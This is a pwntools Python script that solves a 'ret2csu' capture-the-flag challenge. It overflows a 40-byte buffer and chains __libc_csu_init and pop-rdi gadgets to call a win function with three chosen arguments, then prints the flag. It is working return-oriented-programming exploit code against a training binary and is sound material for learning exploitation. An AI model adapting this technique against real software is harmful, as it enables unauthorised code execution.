#!/usr/bin/env python3

from pwn import *

exe = ELF("ret2csu_patched")
libc = ELF("libret2csu.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    rtw = 0x400510
    popers = 0x40069a
    movers = 0x400680
    poprdi = 0x4006a3

    payload = flat(b'A'*offset, popers, 0x3, 0x4, 0x600e30, 0x0, 0xcafebabecafebabe, 0xd00df00dd00df00d, movers, pack(0) * 7, poprdi, 0xdeadbeefdeadbeef, rtw)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
